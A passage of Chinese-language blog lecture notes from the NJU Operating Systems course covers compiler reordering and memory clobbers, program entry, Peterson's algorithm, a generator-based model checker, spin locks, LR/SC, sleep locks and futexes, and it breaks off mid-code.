<h3 id="Example-Compile-Optimization"><a href="#Example-Compile-Optimization" class="headerlink" title="Example: Compile Optimization"></a>Example: Compile Optimization</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g++;</span><br><span class="line">    g++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开启 <code>-O1</code> 优化后，得到的汇编代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;foo&gt;:</span><br><span class="line">   0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   4:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>编译器直接将 <code>g++</code> 删除了，因为没有返回，这两句话没有作用。</p>
<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> g;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g++;</span><br><span class="line">  	g++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>汇编代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;foo&gt;:</span><br><span class="line">   0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   4:	83 05 00 00 00 00 02 	addl   $0x2,0x0(%rip)        # b &lt;foo+0xb&gt;</span><br><span class="line">   b:	c3                   	ret </span><br></pre></td></tr></table></figure>

<p>因为 g 是外部变量，所以这里对 g 的操作是有意义的，但连续的两次 +1 可以用一次 +2 来代替。</p>
<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> g;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g++;</span><br><span class="line">	<span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;nop&quot;</span> : : <span class="string">&quot;r&quot;</span>(x))</span></span>;</span><br><span class="line">  	g++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>汇编代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;foo&gt;:</span><br><span class="line">   0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   4:	90                   	nop</span><br><span class="line">   5:	83 05 00 00 00 00 02 	addl   $0x2,0x0(%rip)        # c &lt;foo+0xc&gt;</span><br><span class="line">   c:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>这说明编译器可以调整语句的顺序，然后将两个 +1 合并成一个 +2。</p>
<p>但我们有手段可以让编译器无法进行这个合并：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> g;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g++;</span><br><span class="line">	<span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;nop&quot;</span> : : <span class="string">&quot;r&quot;</span>(x) : <span class="string">&quot;memory&quot;</span>)</span></span>;</span><br><span class="line">    g++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>汇编代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;foo&gt;:</span><br><span class="line">   0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   4:	83 05 00 00 00 00 01 	addl   $0x1,0x0(%rip)        # b &lt;foo+0xb&gt;</span><br><span class="line">   b:	90                   	nop</span><br><span class="line">   c:	83 05 00 00 00 00 01 	addl   $0x1,0x0(%rip)        # 13 &lt;foo+0x13&gt;</span><br><span class="line">  13:	c3                   	ret </span><br></pre></td></tr></table></figure>

<p>中间插入的内联汇编语句使用了 memory clobber，其意思是告诉编译器这些内联汇编代码可能会任意读取、修改内存内容，因此编译器在调整语句顺序时，不能超过这个 asm block。这句话就像一堵墙一样挡在中间，使得两处 +1 无法被合并。</p>
<p>该手法在操作系统的锁机制中有重要的应用 (避免编译器将 critical section 中的语句优化到外面，导致 race condition)。</p>
<h2 id="Programs-OS-Perspective"><a href="#Programs-OS-Perspective" class="headerlink" title="Programs: OS Perspective"></a>Programs: OS Perspective</h2><p>操作系统眼中的程序：程序=计算+syscall+计算+syscall+…… 程序只能通过操作系统允许的方式来访问操作系统掌控的资源，从而操作系统掌握了计算机的“霸权”。</p>
<h3 id="Example-Entering-a-Program"><a href="#Example-Entering-a-Program" class="headerlink" title="Example: Entering a Program"></a>Example: Entering a Program</h3><blockquote>
<p>一个 C 程序执行的第一条指令在哪里？</p>
</blockquote>
<p>最合理的方法：用 gdb 打开可执行文件，然后用 <code>starti</code> 指令定位到第一条汇编指令，发现在 <code>/lib64/ld-linux-x86-64.so.2</code> 中。这是一个加载器，加载器负责跳转到 <code>__start()</code> 执行。</p>
<blockquote>
<p><strong>凭什么不能是 rtfm.so?</strong></p>
<p>使用 readelf 工具，可以看到在可执行文件中说明了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]</span><br></pre></td></tr></table></figure>

<p>如果我们直接对 a.out 进行修改，将 ld-linux-x86-64.so.2 字段改为 rtfm.so，再创建一个从 rtfm.so 到 ld-linux-x86-64.so.2 的链接，我们就真的可以实现用我们制定的 rtfm.so 来加载程序。</p>
<p><u>计算机系统不存在玄学，一切都建立在确定的机制上。</u></p>
</blockquote>
<p>在执行 main() 函数之前，程序经历了很多的过程，使用了很多的系统调用，用 strace 工具可以查看这些系统调用(注：strace 会输出到标准错误，重定向时要注意)。 C 语言还支持在进入 main() 函数之前和之后做事情：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello-goodbye.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, World\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// See also: atexit(3)</span></span><br><span class="line">__attribute__((destructor)) <span class="function"><span class="keyword">void</span> <span class="title">goodbye</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Goodbye, Cruel OS World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Tip: 利用 Vim 来整理不易阅读的输入内容</strong></p>
<p>strace 输出的内容杂乱难读，利用 vim 对其进行整理可以帮助我们阅读。常用的整理命令可以有：</p>
<ul>
<li><code>:%! grep [-v] word</code> 筛选出包含 word 的行 (-v 参数可以反向筛选)。</li>
<li><code>:%s/, \r /g</code> 将所有的 <code>,</code> 替换为换行符。人类倾向于阅读行数多但每行都很短的内容。</li>
<li>……</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 04: Understanding Concurrent Programs</title>
    <url>/2022/02/23/NJU-OS%20Lecture%2004%20-%20Understanding%20Concurrent%20Programs/</url>
    <content><![CDATA[<p>互斥 (mutual exclusion)：保证两个线程不能同时 (并发) 执行一段代码。</p>
<p>对于 <code>sum.c</code> ，我们希望添加两个魔法函数 lock() 和 unlock()，使得魔法函数中间的代码具有互斥性：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">void Tsum()</span><br><span class="line">&#123;</span><br><span class="line">	for (int i = 0; i &lt; N; i++)</span><br><span class="line">	&#123;</span><br><span class="line"><span class="addition">+		lock();</span></span><br><span class="line">		sum++;</span><br><span class="line"><span class="addition">+		unlock();</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>一个失败的尝试：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOCK   1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNLOCK 0</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">critical_section</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">retry:</span><br><span class="line">    <span class="keyword">if</span> (locked != UNLOCK)   <span class="comment">//*</span></span><br><span class="line">        <span class="keyword">goto</span> entry;</span><br><span class="line">    locked = LOCK;          <span class="comment">//**</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// critical section</span></span><br><span class="line">    </span><br><span class="line">    locked = UNLOCK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从状态机的角度：</p>
<pre class="mermaid">stateDiagram-v2
    state1: T1-L*, T2-L*
    state1 --> state2: 线程T1执行
    state1 --> state3: 线程T2执行
    state3: ……
    state2: T1-L**, T2-L*
    state2 --> state4: 线程T1执行
    state2 --> state5: 线程T2执行
    state4: ……
    state5: T1-L**, T2-L**</pre>

<p>可以看到存在一个状态，T1 和 T2 同时获得了锁。该方法失败的根本原因是：我们读锁状态的操作和写锁状态的操作无法原子地执行。</p>
<h2 id="Peterson-Algorithm"><a href="#Peterson-Algorithm" class="headerlink" title="Peterson Algorithm"></a>Peterson Algorithm</h2><p>理解并发的最好方法就是用物理世界中的东西作类比：</p>
<ul>
<li>对共享内存的写：往黑板上贴便签条</li>
<li>对共享内存的读：看黑板 (其实不同于人类，计算机的“读”只能看到一个“历史状态”)</li>
</ul>
<hr>
<p>假设 Alice 和 Bob 想上厕所，为了不一起进入厕所，他们制定了如下协议：</p>
<ul>
<li>Alice 想上厕所，于是举起了自己的旗子 (step1，相当于 STORE 一个共享的变量)，然后将 Bob (对方) 的名字写在厕所门上 (step2，也相当于 STORE 一个共享变量)；如果 Bob 想上厕所也是同理。注意厕所门上的名字是可以覆盖的。</li>
<li>Alice 检查门上的名字和厕所 (step3)，Alice 可以进入厕所当且仅当 Bob 没有举旗子，或者门上的名字是自己的。</li>
<li>Alice 上完厕所后，把自己的旗子放下来 (step4)。</li>
</ul>
<p>我们讨论几种情况：</p>
<ul>
<li>Alice 检查的时候，如果 Bob 没举旗子，说明 Bob 还不想上厕所，那 Alice 可以上厕所。</li>
<li>如果 Bob 也举旗子了，那结果是：先举旗子的人可以先进入厕所，因为后举旗子的人会把先举旗子的人的名字贴在门上，覆盖了先贴的人的内容。</li>
<li>……</li>
</ul>
<p>一个完备的证明方法是画状态机。我们设置状态机 $(PC_1, PC_2, x, y, turn,status)$，六个状态分别表示 T1/T2 执行到第几行，T1/T2 的旗子有没有举起来，当前厕所门上写的是谁的名字，以及当前厕所状态。</p>
<pre class="mermaid">stateDiagram-v2
    s1: (1, 1, 0, 0, A, e)
    s1 --> s2: T1
    s2: (2, 1, 1, 0, A, e)
    s1 --> s3: T2
    s3: (1, 2, 0, 1, A, e)
    note left of s3
        T1先执行与T2先执行完全等价
        该分支省略
    end note
    s2 --> s4: T1
    s4: (3, 1, 1, 0, B, e)
    s2 --> s5: T2
    s5: (2, 2, 1, 1, A, e) 
    s4 --> s6: T1
    s6: (3, 1, 1, 0, B, A)
    s4 --> s7: T2
    s7: (3, 2, 1, 1, B, e)
    s7 --> s7: T1
    s7 --> s20: T2
    s20: (3, 3, 1, 1, A, e)
    s20 --> s14: T1
    s20 --> s20: T2
    s5 --> s7: T1
    s5 --> s9: T2
    s9: (2, 3, 1, 1, A, e)
    note right of s9
        与左孩子完全等价
        该分支省略
    end note
    s6 --> s10: T1
    s6 --> s11: T2
    s11: (3, 2, 1, 1, B, A)
    s10: (4, 1, 1, 0, B, e)
    s10 --> s12: T1
    s10 --> s15: T2
    s12: (1, 1, 0, 0, B, e)
    s15: (4, 2, 1, 1, B, e)
    s11 --> s15: T1
    s11 --> s14: T2
    s14: (3, 3, 1, 1, A, A)
    s14 --> s17: T1
    s14 --> s14: T2
    s15 --> s16: T1
    s15 --> s17: T2
    s16: (1, 2, 0, 1, B, e)
    s17: (4, 3, 1, 1, A, e)
    s17 --> s18: T1
    s17 --> s17: T2
    s18: (1, 3, 0, 1, A, e)</pre>

<p>我们还可以写一个小程序验证 Peterson：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BARRIER __sync_synchronize()	</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">critical_section</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> cnt = atomic_fetch_add(&amp;count, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">int</span> i = atomic_fetch_add(&amp;nested, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (i != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d threads in the critical section @ count=%ld\n&quot;</span>, i, cnt);</span><br><span class="line">    assert(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  atomic_fetch_add(&amp;nested, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="keyword">volatile</span> x = <span class="number">0</span>, y = <span class="number">0</span>, turn;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    x = <span class="number">1</span>;                   BARRIER;</span><br><span class="line">    turn = B;                BARRIER; <span class="comment">// &lt;- this is critcal for x86</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!y) <span class="keyword">break</span>;         BARRIER;</span><br><span class="line">      <span class="keyword">if</span> (turn != B) <span class="keyword">break</span>;  BARRIER;</span><br><span class="line">    &#125;</span><br><span class="line">    critical_section();</span><br><span class="line">    x = <span class="number">0</span>;                   BARRIER;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    y = <span class="number">1</span>;                   BARRIER;</span><br><span class="line">    turn = A;                BARRIER;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!x) <span class="keyword">break</span>;         BARRIER;</span><br><span class="line">      <span class="keyword">if</span> (turn != A) <span class="keyword">break</span>;  BARRIER;</span><br><span class="line">    &#125;</span><br><span class="line">    critical_section();</span><br><span class="line">    y = <span class="number">0</span>;                   BARRIER;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 critical_section() 中，代码主要做的事情是操作一个共享变量，如果某个时刻 <code>nested == 2</code>，说明两个线程同时进入了临界区域，则报错。</p>
<p>由于现代编译器和多处理器会调整语句顺序/乱序执行……所以我们在每条语句后面添加一条 <code>__sync_synchronize()</code> 来保证编译按照顺序进行，且多处理器之间具有可见性。事实证明，如果去掉 BARRIER 会发生错误。</p>
<h2 id="Model-Checker"><a href="#Model-Checker" class="headerlink" title="Model Checker"></a>Model Checker</h2><p>我们希望用程序自动画出状态机。<a href="https://kristoff-starling.github.io/files/model-checker.py">model-checker.py</a> 帮助我们完成了这项工作，其中用到的 python 语言机制较多，暂时留坑。我们可以用 <code>model-checker.py</code> 中编写的装饰器来编写多个线程，<a href="https://kristoff-starling.github.io/files/peterson-flag.py">peterson-flag.py</a> 是一个示例。使用命令 <code>python3 model-checker.py xxx.py</code> 可以输出状态机的所有节点和转移关系。</p>
<p><code>model-checker.py</code> 主要利用了 python generator 的机制来快速获得进程的状态机。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">numbers</span>(<span class="params">init=<span class="number">0</span>, step=<span class="number">1</span></span>):</span></span><br><span class="line">    n = init</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n += step</span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line"></span><br><span class="line">g = numbers()</span><br><span class="line">h = numbers(<span class="number">100</span>, <span class="number">200</span>)</span><br><span class="line"><span class="built_in">print</span>(g, h)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(g.__next__())</span><br><span class="line"><span class="built_in">print</span>(g.__next__())</span><br><span class="line"><span class="built_in">print</span>(h.__next__())</span><br><span class="line"><span class="built_in">print</span>(g.__next__())</span><br><span class="line"><span class="built_in">print</span>(h.__next__())</span><br></pre></td></tr></table></figure>

<p>该程序输出结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;generator object numbers at 0x7f0a75b4fcf0&gt; &lt;generator object numbers at 0x7f0a759f9ba0&gt;</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">300</span><br><span class="line">3</span><br><span class="line">500</span><br></pre></td></tr></table></figure>

<p>虽然 numbers() 里面是一个死循环，但执行 numbers() 还是可以退出，这得益于 <code>yield</code> 语句，yield 的功能类似于操作系统的调度，它会主动让出执行流。<code>g.__next__()</code> 语句可以从被打断处重新进入，继续执行函数直到遇到下一次 yield。如果我们在每一条语句后面都加上一个 yield，让 yield 后面返回所有的线程局部变量，我们就获得了函数每执行一步之后的状态机。</p>
<p>Model checker 将验证程序正确性的问题转化成了一个图论问题：</p>
<ul>
<li><p>Safety (线程是否互斥)：从初始状态出发，是否存在到红色 (互斥失败) 节点的路径？</p>
<blockquote>
<p>图搜索</p>
</blockquote>
</li>
<li><p>Liveness：是否从任意黑色 (没有人执行临界区域代码) 状态出发，总能在有限步内到达蓝色/绿色 (有一个线程执行临界区域代码) 节点？</p>
<blockquote>
<p>这等价于只考虑图中的黑色节点，是否存在环。只要对黑色节点的导出子图求 SCC 即可。</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 05: Concurrent Programming: Mutex</title>
    <url>/2022/03/01/NJU-OS%20Lecture%2005%20-%20Concurrent%20Programming%20-%20Mutex/</url>
    <content><![CDATA[<p>从 high level 来看，我们希望实现如下的结构体和 API：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">typdef <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;lock;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">(lock *lk)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">(lock *lk)</span></span>;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>若 lock() 函数返回，说明获得了这个锁，别的进程会停在 lock() 里直到获得锁的人调用了 unlock()。</p>
<p>实现互斥的根本困难：不能同时读写共享内存。</p>
<ul>
<li>load 的时候不能 store，且看完之后眼睛立刻闭上，看到的都是过去的东西；</li>
<li>store 的时候不能 load，贴字条的时候不知道覆盖了什么。</li>
</ul>
<h2 id="Spin-Lock"><a href="#Spin-Lock" class="headerlink" title="Spin Lock"></a>Spin Lock</h2><blockquote>
<p>“解决一个问题有两种方法：一个是分析问题、提出算法、实现解决，一个是解决提出问题的人。“ —— jyy</p>
</blockquote>
<p>我们希望硬件支持一条“瞬间完成读和写”的指令：“请所有人闭眼，然后我睁开眼看一眼，并做一个操作”。</p>
<h3 id="x86-Lock-Prefix"><a href="#x86-Lock-Prefix" class="headerlink" title="x86: Lock Prefix"></a>x86: Lock Prefix</h3><p>以 lock 为前缀的指令支持原子操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sum-atomic.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tsum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;lock addq $1, %0&quot;</span>: <span class="string">&quot;+m&quot;</span>(sum))</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  create(Tsum);</span><br><span class="line">  create(Tsum);</span><br><span class="line">  join();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sum = %ld\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于这里的 +1 操作使用了原子指令，所以程序总能得到 2N 的输出。</p>
<p>此外，一条非常好用的原子指令是 xchg，它可以原子地将一个数值和一个内存地址上的值交换。用 C 语言封装后的形式可以是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xchg</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *addr, <span class="keyword">int</span> newval)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;lock xchg %0, %1&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;+m&quot;</span>(*addr), <span class="string">&quot;=a&quot;</span>(result) : <span class="string">&quot;1&quot;</span>(newval))</span></span>; <span class="comment">//xchg默认原子，即使不加前缀lock也可以</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>借助 <code>xchg</code> 指令，我们可以轻松地实现一个自旋锁：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> lock = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;<span class="keyword">while</span> (xchg(&amp;lock, <span class="number">1</span>));&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> </span>&#123;xchg(&amp;lock, <span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>在硬件层面，硬件可以保证所有的带 lock 的指令可以排出一个全序，且原子指令相关的内存都会被提前做好 (内存的可见性)。但这其中有很多技术细节，比如多核的 Cache 之间的一致性是 x86 的噩梦 (一旦某个 CPU 要获得所，其他所有 CPU 核的 L1 Cache 都要上锁)。</p>
<h3 id="RISC-V-LR-SC"><a href="#RISC-V-LR-SC" class="headerlink" title="RISC-V: LR/SC"></a>RISC-V: LR/SC</h3><p>原子指令内部的本质是三个步骤：load(), exec(), store()。RISC-V 提供了 load-reserved/store-conditional (LR/SC) 机制：</p>
<ul>
<li>LR: 在共享内存上打一个标记，如果出现中断、别的线程写入等情况，这个标记会消失。</li>
<li>exec()：在寄存器上做一些自己的事情</li>
<li>SC：如果共享内存上的标记还在，则 store。</li>
</ul>
<p>这里给出一个用于自旋锁的 compare-and-swap (旧值等于某个值才将新值与其交换) 函数的实现，用这个函数实现自旋锁在轮询时可以比 xchg 少一次写入操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C语言语义</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cas</span><span class="params">(<span class="keyword">int</span> *addr, <span class="keyword">int</span> cmp_val, <span class="keyword">int</span> new_val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> old_val = *addr;</span><br><span class="line">    <span class="keyword">if</span> (old_val == cmp_val) &#123;*addr = new_val;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cas:</span><br><span class="line">	lr.w t0, (a0)		# 获得旧值，并对(a0)打标记</span><br><span class="line">	bne t0, a1, fail	# 如果 old_val != cmp_val 则跳转到 fail</span><br><span class="line">	sc.w t0, a2, (a0)	# 如果标记还在，将a2写入(a0)，t0存储标记存在情况</span><br><span class="line">	bnez t0, cas		# 如果标记被冲刷了，说明出现race condition，回到cas重做</span><br><span class="line">	jr ra</span><br><span class="line">fail</span><br><span class="line">	li a0, 1</span><br><span class="line">	jr ra</span><br></pre></td></tr></table></figure>

<p>如果有两个线程同时希望获得锁，第一个线程执行完 sc.w 后，第二个线程的标记被冲刷，从而第二个线程执行 sc.w 后 t0=1，无法获得锁。</p>
<p>LR/SC 机制不仅可以实现锁，还可以让每个线程知道锁的拥堵情况。</p>
<h2 id="Sleep-Lock"><a href="#Sleep-Lock" class="headerlink" title="Sleep Lock"></a>Sleep Lock</h2><p>自旋锁的性能缺陷：</p>
<ul>
<li>如果多个线程同时争抢锁，并行/并发的程序会因为自旋锁变得串行。除了进入临界区域的线程，其他的线程都在空转。</li>
<li>如果持有自旋锁的线程被调度走了，那么所有的线程都进不去了。</li>
</ul>
<p>自旋锁的理想使用场景：</p>
<ul>
<li>临界区几乎不拥堵。</li>
<li>持有自旋锁时禁止执行流切换 - 这件事对于应用程序来说太危险了，因此自旋锁一般用于操作系统内核中的并发数据结构 (临界区很短)。</li>
</ul>
<hr>
<p>如果锁被占用，待在原地等待锁被释放是一件不太聪明的事情 (尤其是要等很长时间的时候)，我们希望一个线程在等待锁的时候可以被暂时挂起，让出 CPU，等到锁被释放时再唤醒等锁进程。</p>
<p>C 语言代码是做不到 ”让出 CPU 的”，因此我们需要两个系统调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">syscall(SYSCALL_lock, &amp;lk);		<span class="comment">// 试图获得lk，如果失败则当前进程被挂起</span></span><br><span class="line">syscall(SYSCALL_unlock, &amp;lk);	<span class="comment">// 释放lk，并唤醒正在等待lk的进程</span></span><br></pre></td></tr></table></figure>

<p>操作系统的工作是维护这个锁和等待锁的进程</p>
<ul>
<li>如果有线程尝试获得锁，且锁处于空闲状态，就把锁给他。</li>
<li>如果有线程尝试获得锁但锁已经被取走了，则将当前线程加入等待锁的队列，并将其挂起。</li>
<li>如果有线程释放了锁，就检查等待锁的队列中是否有线程，如果有则将锁交给下一位 (唤醒它)，如果没有则锁的状态为空闲。</li>
<li>操作系统使用自旋锁保证自己对队列的操作是原子的。</li>
</ul>
<blockquote>
<p><strong>Tip: GDB Usage</strong></p>
<p>使用 GDB 调试多线程时，如果直接使用 next 命令，所有的线程都会向后走一步。为了更好地观测程序行为，我们可以使用 <code>set scheduler-lock on</code> 命令来打开线程锁，之后再使用 next 命令就只有当前线程会向前走一步。我们可以通过 <code>info threads</code> 来查看线程信息，通过 <code>thread id</code> 来切换当前调试的线程为 id。</p>
</blockquote>
<h2 id="Futex"><a href="#Futex" class="headerlink" title="Futex"></a>Futex</h2><ul>
<li>自旋锁有更快的 fast path：如果获得锁成功，可以立刻进入临界区；但如果没有获得锁，则要浪费 CPU 时钟周期。</li>
<li>睡眠锁有更快的 slow path: 如果没有获得锁，可以执行线程切换；但在能获得锁的情况下，也需要执行系统调用陷入内核。</li>
</ul>
<p>我们希望发明一种锁，对于 fast path，只需要一条原子指令就可以获得锁，对于 slow path，可以通过系统调用 yield。这就是 Futex = spin + mutex。</p>
<p>我们可以利用 model checker 来确认 futex 的正确性：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Futex</span></span></span><br><span class="line"><span class="class">	<span class="title">locked</span>, <span class="title">waits</span> = &#x27;&#x27;, &#x27;&#x27;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">tryacquire</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.locked:</span><br><span class="line">            <span class="comment"># Test-and-set (cmpxchg)</span></span><br><span class="line">            <span class="comment"># Same effect, but more efficient than xchg</span></span><br><span class="line">            self.locked = <span class="string">&#x27;🔒&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;🔒&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">release</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span 